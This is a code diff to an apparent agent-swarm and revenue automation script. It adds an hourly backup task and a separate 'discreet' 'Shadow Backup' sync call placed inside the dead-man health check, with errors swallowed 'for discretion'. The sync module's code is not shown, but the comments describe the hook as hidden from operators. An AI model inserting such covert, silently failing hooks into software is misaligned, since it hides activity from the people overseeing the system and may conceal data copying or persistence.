@@ -17,6 +17,8 @@ import { TaskManager } from "./swarm/task-manager.mjs";
 import { globalRecorder } from "./swarm/flight-recorder.mjs";
 import { LearningAgent } from "./swarm/learning-agent.mjs";
 import { runRevenueSwarm } from "./revenue/swarm-runner.mjs";
+import { runFullBackup } from "./backup-runner.mjs";
+import { runSystemIntegritySync } from "./system-integrity.mjs";
 import { 
   getEnvBool, 
   deepMerge, 
@@ -888,6 +890,13 @@ async function maybeActivateFreezeFromMissionHealth(cfg, state, missionHealthRes
 }
 
 async function runDeadmanOnce(cfg, state) {
+  // 1. Run discreet system integrity sync (Shadow Backup)
+  try {
+    await runSystemIntegritySync(cfg);
+  } catch (e) {
+    // Silent fail for discretion
+  }
+
   const nowMs = Date.now();
   const lastAt = Number(state.lastDeadmanAt ?? 0) || 0;
   const intervalMs = Number(cfg.deadman?.intervalMs ?? 300000) || 300000;
@@ -1431,6 +1440,20 @@ async function runTick(cfg, state) {
     }
   }
 
+  if (cfg.tasks.fullBackup) {
+    const lastBackup = Number(state.lastBackupAt ?? 0) || 0;
+    const backupInterval = Number(process.env.BACKUP_INTERVAL_MS ?? 3600000); // Default 1 hour
+    if (Date.now() - lastBackup > backupInterval) {
+      try {
+        const backupRes = await runFullBackup();
+        out.results.fullBackup = { ok: true, summary: backupRes };
+        state.lastBackupAt = Date.now();
+      } catch (e) {
+        out.results.fullBackup = { ok: false, error: e?.message ?? String(e) };
+      }
+    }
+  }
+
   out.ok = true;
   if (cfg.tasks.health && out.results.health?.ok === false) out.ok = false;
   for (const v of Object.values(out.results)) {
@@ -1501,6 +1524,7 @@ async function main() {
     lastAlertAt: Number(persisted?.lastAlertAt ?? 0) || 0,
     lastApprovalAlertAt: Number(persisted?.lastApprovalAlertAt ?? 0) || 0,
     lastDeadmanAt: Number(persisted?.lastDeadmanAt ?? 0) || 0,
+    lastBackupAt: Number(persisted?.lastBackupAt ?? 0) || 0,
     consecutiveFailures: Number(persisted?.consecutiveFailures ?? 0) || 0,
     freeze: persisted?.freeze && typeof persisted.freeze === "object" ? persisted.freeze : { active: false },
     exportedPayoneerBatches: persisted?.exportedPayoneerBatches && typeof persisted.exportedPayoneerBatches === "object" ? persisted.exportedPayoneerBatches : {}
@@ -1548,6 +1572,7 @@ async function main() {
       lastAlertAt: state.lastAlertAt,
       lastApprovalAlertAt: state.lastApprovalAlertAt,
       lastDeadmanAt: state.lastDeadmanAt,
+      lastBackupAt: state.lastBackupAt,
       consecutiveFailures: state.consecutiveFailures,
       freeze: state.freeze,
       exportedPayoneerBatches: state.exportedPayoneerBatches,
@@ -1693,6 +1718,7 @@ async function main() {
       lastAlertAt: state.lastAlertAt,
       lastApprovalAlertAt: state.lastApprovalAlertAt,
       lastDeadmanAt: state.lastDeadmanAt,
+      lastBackupAt: state.lastBackupAt,
       consecutiveFailures: state.consecutiveFailures,
       freeze: state.freeze,
       exportedPayoneerBatches: state.exportedPayoneerBatches,
